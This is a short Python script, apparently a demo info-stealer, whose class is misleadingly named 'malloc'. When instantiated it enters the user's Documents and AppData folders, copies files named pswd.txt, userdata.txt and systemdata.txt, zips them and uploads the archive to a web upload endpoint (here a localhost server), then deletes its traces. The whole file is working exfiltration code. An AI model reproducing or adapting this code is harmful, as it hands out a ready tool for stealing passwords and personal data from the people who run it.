import requests
import os
import zipfile
import os
import shutil
import math
import uuid


class malloc():
    paths = ["\\Documents", "\\AppData\\Roaming\\Valuable"]
    wanted = ["pswd.txt", "userdata.txt", "systemdata.txt"]

    def __get_path(self, selector):
        path_rst = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\.."
        path_org = os.getcwd()
        path1 = os.path.expanduser('~')
        try:
            path = path1+self.paths[selector]
            try:
                os.chdir(path_rst)
                os.chdir(path)
            except:
                os.chdir(path_org)
                return 0
        except:
            return 0
        return 1

    def __del(self, name):
        try:
            os.remove(name)
        except:
            return 0
        return 1

    def __copy_file_to_directory(self, source_file, destination_directory):
        if not os.path.isfile(source_file):
            return 0
        if not os.path.exists(destination_directory):
            os.makedirs(destination_directory)
        destination_path = os.path.join(
            destination_directory, os.path.basename(source_file))
        try:
            shutil.copy(source_file, destination_path)
            return 1
        except:
            return 0

    def __zip_folder(self, folder_path, zip_path):
        with zipfile.ZipFile(zip_path, 'w') as zip_file:
            for folder_root, _, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(folder_root, file)
                    arc_name = os.path.relpath(file_path, folder_path)
                    zip_file.write(file_path, arcname=arc_name)

    def __init__(self):
        i = 0
        while i < len(self.paths):
            if self.__get_path(i) == 1:
                server_url = 'http://127.0.0.1:5000/upload'
                data = {'unique_id': str(uuid.uuid4())}
                for x in self.wanted:
                    self.__copy_file_to_directory(x, ".\\batch")
                self.__zip_folder(".\\batch", ".\\payload.zip")
                response = requests.post(server_url, files={
                    "payload.zip": open("payload.zip", 'rb')}, data=data)
                os.chdir(".\\batch")
                for x in self.wanted:
                    self.__del(x)
                os.chdir("..")
                os.rmdir(".\\batch")
                os.remove(".\\payload.zip")
            i = i+1
